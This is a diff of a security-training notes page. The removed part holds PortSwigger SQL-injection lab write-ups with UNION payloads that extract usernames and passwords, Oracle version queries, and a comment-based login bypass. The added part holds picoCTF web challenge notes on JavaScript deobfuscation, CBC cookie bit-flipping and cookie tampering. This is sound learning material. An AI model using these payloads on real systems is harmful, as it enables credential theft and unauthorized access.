-<p>This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.</p>
-<p>The database contains a different table called users, with columns called username and password.</p>
-<p>To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.</p>
-</div>
-<p>This is very much like the prior scenario, but uses the structure from the prior challenges wherein you have three columns, and only the second is compatible with strings. Therefore, we have to shove both the username and password into the same field. This can be done with a query that looks like the following:</p>
-<div class="highlight"><pre><span></span><code>// determine how many columns exist
-filter?category=Pets&#39; UNION SELECT NULL,NULL --
-
-// confirm which columns support text:
-filter?category=Pets&#39; UNION SELECT NULL,&#39;a&#39; -- (column 2)
-
-// grab the username/password and stuff them into the 2nd column
-/filter?category=Pets&#39; UNION SELECT NULL,username || &#39;~&#39; || password from users --
-</code></pre></div>
-<p>This yeilds a result like the following:</p>
-<div class="highlight"><pre><span></span><code>More Than Just Birdsong
-Pest Control Umbrella
-Babbage Web Spray
-administrator~o7188srj54a849wwm2cq
-Giant Grasshopper
-wiener~8hxtfx4depv2otj53nb9
-carlos~z54oyd1moidzjxuz9oxm
-</code></pre></div>
-<p>And we can then log in as the administrator, solving the challenge</p>
-<h2 id="sql-injection-attack-querying-the-database-type-and-version-on-oracle"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10A10 10 0 0 0 12 2m0 2a8 8 0 0 1 8 8c0 2.4-1 4.5-2.7 6-1.4-1.3-3.3-2-5.3-2s-3.8.7-5.3 2C5 16.5 4 14.4 4 12a8 8 0 0 1 8-8m2 1.89c-.38.01-.74.26-.9.65l-1.29 3.23-.1.23c-.71.13-1.3.6-1.57 1.26-.41 1.03.09 2.19 1.12 2.6 1.03.41 2.19-.09 2.6-1.12.26-.66.14-1.42-.29-1.98l.1-.26 1.29-3.21.01-.03c.2-.51-.05-1.09-.56-1.3-.13-.05-.26-.07-.41-.07M10 6a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1M7 9a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1m10 0a1 1 0 0 0-1 1 1 1 0 0 0 1 1 1 1 0 0 0 1-1 1 1 0 0 0-1-1Z"/></svg></span> SQL injection attack, querying the database type and version on Oracle<a class="headerlink" href="#sql-injection-attack-querying-the-database-type-and-version-on-oracle" title="Permanent link">&para;</a></h2>
-<div class="admonition question">
-<p class="admonition-title">Question</p>
-<p>This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.</p>
-<p>To solve the lab, display the database version string.</p>
-</div>
+<p>In order to understand what is going on (and get the flag), you need to know the following:
+* <code>_0x48c3be</code> is a function pointer, declared two lines prior, that points to the function defined on line 28 of the de-mangled javascript (<code>const _0x4e0e = function (_0x553839, _0x53c021) {</code>).
+* you then need to know how the <code>_0x4e0e()</code> function works.
+* It essentially takes in a number, subtracts <code>470</code> from it, and then uses the result as an index into the <code>_0x402c</code> array defined at the top of the file.
+* Before you get too excited, however, you need to understand that the immediately-executing function defined prior to the current code block (line <code>33</code> for me, which starts liek <code>(function (_0x76dd13, _0x3dfcae) {</code>) modifies/sorts the array into a different order. Without this knowledge, your indicies will point to the wrong place.
+* Having done all of that, you can determine that <code>fetch()</code> call referenced above is grabbing a pre-compiled blob of web assembly code. If you download that file (<code>http://mercury.picoctf.net:26318/JIFxzHyW8W</code>) and run strings on it, you will see the flag you can submit.</p>
 <div class="admonition tip">
 <p class="admonition-title">Tip</p>
-<p>I failed quite a bit on this until I clicked the 'hint' and learned that every select on ORACLE needs a from stmt. </p>
+<p>A few things that were helpful for me as I worked through this one:
+* Using <a href="https://jsbin.com">jsbin</a> to execute random JavaScript was quite helpful
+* Figuring out that when FireFox's dev tools "demangled" the javascript, it left the two words <code>await fetch()</code> slammed together as <code>awaitfetch()</code>. The latter is <em>not</em> a function that you will find, and searching for it will leave you disappointed. Adding the space in between them and <em>then</em> trying to understand the code will place you in a much better position.</p>
 </div>
-<div class="highlight"><pre><span></span><code>// determine how many columns are being returned (2)
-/filter?category=Gifts&#39; ORDER BY 2 --
-
-// confirm that both columns are compatible with strings (using built-in table named `dual`)
-/filter?category=Gifts&#39; UNION SELECT &#39;a&#39;,&#39;a&#39; from dual --
-
-// now let&#39;s start doing something
-/filter?category=Gifts&#39; UNION SELECT version FROM v$version --
-
-// query the banner
-/filter?category=Gifts&#39; UNION SELECT BANNER,&#39;a&#39; from v$version --
+<h3 id="more-cookies">More Cookies<a class="headerlink" href="#more-cookies" title="Permanent link">&para;</a></h3>
+<p>Instructions suggest that there exists "encrypted" cookies that must be modified client-side in order to solve the challenge. Pointer to url: <code>http://mercury.picoctf.net:15614/</code>. Visiting the page shows nothing other than a "reset" link and a comment that only the admin can use the cookie search page.</p>
+<p>After poking around a little in Firefox and seeing the cookie (text below), I decided to open up Burp and start there.</p>
+<div class="highlight"><pre><span></span><code>Cookie: name=7; auth_name=dEJSZTVtTlZOajVGSWc0WFBRckZzWmtiMi8vNWJkUzQ2MURNLzYySUlXS1BlZXFUK1BqaHk3MGlwTm96ampFTU1qUitXT2s1cXZUWUUrbS9GeXJHZzN0bTltdDBjL21YNXJWSy83YjF6SFR0ektWNWVWVmpwSnErMDFQYW9mVW4=
 </code></pre></div>
-<p>And that produces the solution:</p>
-<div class="highlight"><pre><span></span><code>CORE 11.2.0.2.0 Production
-a
-NLSRTL Version 11.2.0.2.0 - Production
-a
-Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
-a
-PL/SQL Release 11.2.0.2.0 - Production
-a
-TNS for Linux: Version 11.2.0.2.0 - Production
-a
+<p>After decoding the base64 version of <code>auth_name</code>, we were left with this:</p>
+<div class="highlight"><pre><span></span><code>tBRe5mNVNj5FIg4XPQrFsZkb2//5bdS461DM/62IIWKPeeqT+Pjhy70ipNozjjEMMjR+WOk5qvTYE+m/FyrGg3tm9mt0c/mX5rVK/7b1zHTtzKV5eVVjpJq+01PaofUn
+FSly8XvmFjLPdS83KXonEoEDE4cmhz8QwWCiNnsmdS0FrZmIouQghyQcnmOayk2fJ9LNM25QxcQF69MuYoAdXJWd206be16+q39R76T3GOmW7CxUBCl7wtm7W1HmZtPA
 </code></pre></div>
-<h2 id="vulnerability-in-where-clause-allowing-retrieval-of-hidden-data"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a10 10 0 0 1 10 10 10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2m0 2a8 8 0 0 0-8 8c0 2.4 1 4.5 2.7 6 1.4-1.3 3.3-2 5.3-2s3.8.7 5.3 2c1.7-1.5 2.7-3.6 2.7-6a8 8 0 0 0-8-8m2 2a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1m-4 0a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1M6.91 8.94c.13 0 .25.03.39.06l3.2 1.32.27.11c.56-.43 1.32-.55 1.98-.28 1.02.41 1.52 1.58 1.1 2.6a1.992 1.992 0 0 1-2.6 1.1c-.66-.26-1.13-.85-1.25-1.57l-.23-.1-3.22-1.3-.02-.01c-.53-.21-.76-.79-.56-1.31a1 1 0 0 1 .94-.62M17 9a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1Z"/></svg></span> Vulnerability in WHERE clause allowing retrieval of hidden data<a class="headerlink" href="#vulnerability-in-where-clause-allowing-retrieval-of-hidden-data" title="Permanent link">&para;</a></h2>
-<div class="admonition question">
-<p class="admonition-title">Question</p>
-<p>This lab contains an SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out an SQL query like the following:</p>
-<p><code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code></p>
-<p>To solve the lab, perform an SQL injection attack that causes the application to display details of all products in any category, both released and unreleased.</p>
-</div>
-<p>This is a simple challenge to introduce you to the idea of SQL injection. Given a site such as <a href="https://acd01f0d1f5c2eb5c0cc51a2007a0016.web-security-academy.net/">https://acd01f0d1f5c2eb5c0cc51a2007a0016.web-security-academy.net/</a> you can view differenct product categories which are controlled by the URL (e.g. <code>/filter?category=Pets</code>). A simple SQL injection attack added to the end (<code>/filter?category=' OR 1=1 --</code>) solves the challenge by telling the SQL server to return all products with no category set or where 1=1 (which always evaluates to True). Adding the <code>--</code> at the end comments out any remainder of the SQL statment in the application code.</p>
-<h2 id="vulnerability-allowing-login-bypass"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a10 10 0 0 1 10 10 10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2m0 2a8 8 0 0 0-8 8c0 2.4 1 4.5 2.7 6 1.4-1.3 3.3-2 5.3-2s3.8.7 5.3 2c1.7-1.5 2.7-3.6 2.7-6a8 8 0 0 0-8-8m2 2a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1m-4 0a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1M6.91 8.94c.13 0 .25.03.39.06l3.2 1.32.27.11c.56-.43 1.32-.55 1.98-.28 1.02.41 1.52 1.58 1.1 2.6a1.992 1.992 0 0 1-2.6 1.1c-.66-.26-1.13-.85-1.25-1.57l-.23-.1-3.22-1.3-.02-.01c-.53-.21-.76-.79-.56-1.31a1 1 0 0 1 .94-.62M17 9a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1Z"/></svg></span> Vulnerability allowing login bypass<a class="headerlink" href="#vulnerability-allowing-login-bypass" title="Permanent link">&para;</a></h2>
-<div class="admonition question">
-<p class="admonition-title">Question</p>
-<p>This lab contains an SQL injection vulnerability in the login function.</p>
-<p>To solve the lab, perform an SQL injection attack that logs in to the application as the <code>administrator</code> user.</p>
-</div>
-<p>This is another simple case wherein you are encouraged to log in at a standard username/password form (<a href="https://ac031f731e5b8017c0984a7400ba0058.web-security-academy.net/login">https://ac031f731e5b8017c0984a7400ba0058.web-security-academy.net/login</a>). Much like the prior example, however, you can manipulate the query directly by providing a username of <code>administrator'--</code> and any value for the password field. This terminates the query that is presumeably something like 
-<code>SELECT * FROM users WHERE username = 'administrator' AND password = 'myPassword'</code>. It results in the following query: <code>SELECT * FROM users WHERE username = 'administrator'--' AND password = 'no matter'</code></p>
-<h3 id="sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">SQL injection attack, querying the database type and version on MySQL and Microsoft<a class="headerlink" href="#sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft" title="Permanent link">&para;</a></h3>
-<p>Similar to the prior</p>
-<h3 id="sql-injection-attack-listing-the-database-contents-on-oracle">SQL injection attack, listing the database contents on Oracle<a class="headerlink" href="#sql-injection-attack-listing-the-database-contents-on-oracle" title="Permanent link">&para;</a></h3>
+<p>Which wasn't too helpful. I decided to click on the first hint, and was pointed to a wikipedia page on <a href="https://en.wikipedia.org/wiki/Homomorphic_encryption">homomorphic encryption</a></p>
+<p>After reading this article and deciding that it was unhelpful, I clicked on the second hint that basically said, even if you <em>were</em> to crack it, you likely won't be helped out. (<strong>I missed the point here</strong>).</p>
+<p>I noodled around with the challenge for a bit longer, and eventually decided that this was one of those "I need to learn" so I started googling for a write-up. I quickly found one that confirmed that I likely would not have found the solution because I wasn't thinking creatively enough and also wasn't noticing sufficient details.</p>
+<p>The hint about homomorphic encryption should be pointing me to the fact that I might have been able to make some changes to the encrypted text (cipher text) and cause some effect. The second hint in this direction was <em>completely</em> lost on me, in that the challenge description said the following: <em>I forgot <mark>Cookies</mark> can <mark>Be</mark> modified <mark>Client-side,</mark> so now I decided to encrypt them!</em> You'll note that I highlighted the three oddly-capitalized letters, forming <code>CBC</code> which (after reading a bit) should have triggered me into considering a bit-flipping attack (e.g. <code>admin=0</code> vs <code>admin=1</code>) due to the way cipher-block chaining works.</p>
+<p>I learned a bit about how to do this in Python3 and developed a script, only to have it <em>not</em> work. I did some additional reading and found that in the most recent version of the challenge (at least as of 2021), the cookie value was <em>double</em> base64 encoded. I needed to double-decode, bit flip, and then double-encode. With this in place, it "sovled" the problem on the 10<sup>th</sup> byte in, flipping the 0<sup>th</sup> bit.</p>
+<p>Helpful Writeups:</p>
+<ul>
+<li><a href="https://docs.abbasmj.com/ctf-writeups/picoctf2021#more-cookies">https://docs.abbasmj.com/ctf-writeups/picoctf2021#more-cookies</a> (don't take this verbatim)</li>
+<li><a href="https://github.com/HHousen/PicoCTF-2021/blob/master/Web%20Exploitation/More%20Cookies/script.py">https://github.com/HHousen/PicoCTF-2021/blob/master/Web%20Exploitation/More%20Cookies/script.py</a></li>
+</ul>
+<h3 id="where-are-the-robots">where are the robots<a class="headerlink" href="#where-are-the-robots" title="Permanent link">&para;</a></h3>
+<p>After the last one that took me quite a long time to solve, this one was nearly a joke. The title suggests that mabye it is a robots.txt problem. Visiting the URL and then adjusting it for <code>robots.txt</code> renders a page that is prohibited (<code>1bb4c.html</code>). If you point your browser there, you will be presented  the flag.</p>
+<h3 id="logon">logon<a class="headerlink" href="#logon" title="Permanent link">&para;</a></h3>
+<p>This one was, once again, pretty easy. You follow the instructions given and log in as <code>jason</code> (no password). Nothing is obvious other than no flag being shown. If, however, you inspect the cookies, you'll see a parameter that says <code>admin=False</code>. If you alter this to say <code>admin=True</code> and resend the request, you'll be rewarded with the flag to submit.</p>
+<h3 id="dont-use-client-side">dont-use-client-side<a class="headerlink" href="#dont-use-client-side" title="Permanent link">&para;</a></h3>
+<h3 id="it-is-my-birthday">It is my Birthday<a class="headerlink" href="#it-is-my-birthday" title="Permanent link">&para;</a></h3>
+<h3 id="who-are-you">Who are you?<a class="headerlink" href="#who-are-you" title="Permanent link">&para;</a></h3>
+<h3 id="login">login<a class="headerlink" href="#login" title="Permanent link">&para;</a></h3>
+<h3 id="some-assembly-required-2">Some Assembly Required 2<a class="headerlink" href="#some-assembly-required-2" title="Permanent link">&para;</a></h3>
+<h3 id="super-serial">Super Serial<a class="headerlink" href="#super-serial" title="Permanent link">&para;</a></h3>
+<h3 id="most-cookies">Most Cookies<a class="headerlink" href="#most-cookies" title="Permanent link">&para;</a></h3>
+<h3 id="caas">caas<a class="headerlink" href="#caas" title="Permanent link">&para;</a></h3>
+<h3 id="some-assembly-required-3">Some Assembly Required 3<a class="headerlink" href="#some-assembly-required-3" title="Permanent link">&para;</a></h3>
+<h3 id="web-gauntlet-2">Web Gauntlet 2<a class="headerlink" href="#web-gauntlet-2" title="Permanent link">&para;</a></h3>
+<h3 id="picobrowser">picobrowser<a class="headerlink" href="#picobrowser" title="Permanent link">&para;</a></h3>
+<h3 id="client-side-again">Client-side-again<a class="headerlink" href="#client-side-again" title="Permanent link">&para;</a></h3>
+<h3 id="web-gauntlet">Web Gauntlet<a class="headerlink" href="#web-gauntlet" title="Permanent link">&para;</a></h3>
+<h3 id="some-assembly-required-4">Some Assembly Required 4<a class="headerlink" href="#some-assembly-required-4" title="Permanent link">&para;</a></h3>
+<h3 id="x-marks-the-spot">X marks the spot<a class="headerlink" href="#x-marks-the-spot" title="Permanent link">&para;</a></h3>
+<h3 id="notepad">notepad<a class="headerlink" href="#notepad" title="Permanent link">&para;</a></h3>
+<h3 id="irish-name-repo-1">Irish-Name-Repo 1<a class="headerlink" href="#irish-name-repo-1" title="Permanent link">&para;</a></h3>
+<h3 id="web-gauntlet-3">Web Gauntlet 3<a class="headerlink" href="#web-gauntlet-3" title="Permanent link">&para;</a></h3>
+<h3 id="jauth">JAuth<a class="headerlink" href="#jauth" title="Permanent link">&para;</a></h3>
+<h3 id="irish-name-repo-2">Irish-Name-Repo 2<a class="headerlink" href="#irish-name-repo-2" title="Permanent link">&para;</a></h3>
+<h3 id="irish-name-repo-3">Irish-Name-Repo 3<a class="headerlink" href="#irish-name-repo-3" title="Permanent link">&para;</a></h3>
+<h3 id="jawt-scratchpad">JaWT Scratchpad<a class="headerlink" href="#jawt-scratchpad" title="Permanent link">&para;</a></h3>
+<h3 id="java-script-kiddie">Java Script Kiddie<a class="headerlink" href="#java-script-kiddie" title="Permanent link">&para;</a></h3>
+<h3 id="java-script-kiddie-2">Java Script Kiddie 2<a class="headerlink" href="#java-script-kiddie-2" title="Permanent link">&para;</a></h3>
+<h3 id="bithug">Bithug<a class="headerlink" href="#bithug" title="Permanent link">&para;</a></h3>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       Last update:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime">2022-05-24 12:45:27</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime">2022-08-22 13:51:10</span>
       
     
   </small>
@@ -1350,7 +1625,7 @@ a
     <nav class="md-footer__inner md-grid" aria-label="Footer" >
       
         
-        <a href="ps-oscmdi.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: OS Command Injection" rel="prev">
+        <a href="pico-general.html" class="md-footer__link md-footer__link--prev" aria-label="Previous: General Skills" rel="prev">
           <div class="md-footer__button md-icon">
             <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
           </div>
@@ -1359,20 +1634,20 @@ a
               <span class="md-footer__direction">
                 Previous
               </span>
-              OS Command Injection
+              General Skills
             </div>
           </div>
         </a>
       
       
         
-        <a href="ps-csrf.html" class="md-footer__link md-footer__link--next" aria-label="Next: Cross-Site Request Forgery" rel="next">
+        <a href="pico-binex.html" class="md-footer__link md-footer__link--next" aria-label="Next: Binary Exploitation" rel="next">
           <div class="md-footer__title">
             <div class="md-ellipsis">
               <span class="md-footer__direction">
                 Next
               </span>
-              Cross-Site Request Forgery
+              Binary Exploitation
             </div>
           </div>
           <div class="md-footer__button md-icon">
